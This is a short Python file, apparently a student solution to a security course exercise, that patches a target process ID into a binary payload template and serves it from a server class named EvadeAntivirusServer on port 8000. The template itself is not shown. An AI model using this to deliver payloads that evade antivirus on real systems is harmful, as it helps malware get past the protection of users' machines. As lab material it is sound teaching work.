import assemble
import server
import struct


class SolutionServer(server.EvadeAntivirusServer):

    def get_payload(self, pid):

        pid_addr = struct.pack('<L',pid)

        file = open("q4.template","r")
        data = list(file.read())

        for index in range(len(data)):
            if(data[index]   =='\x78'and\
            data[index+1]=='\x56'and\
            data[index+2]=='\x34'and\
            data[index+3]=='\x12'):

                data[index]   = pid_addr[0]
                data[index+1] = pid_addr[1]
                data[index+2] = pid_addr[2]
                data[index+3] = pid_addr[3]
        return "".join(data)
            
    def print_handler(self, payload, product):
        print(product)

    def evade_antivirus(self, pid):
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)

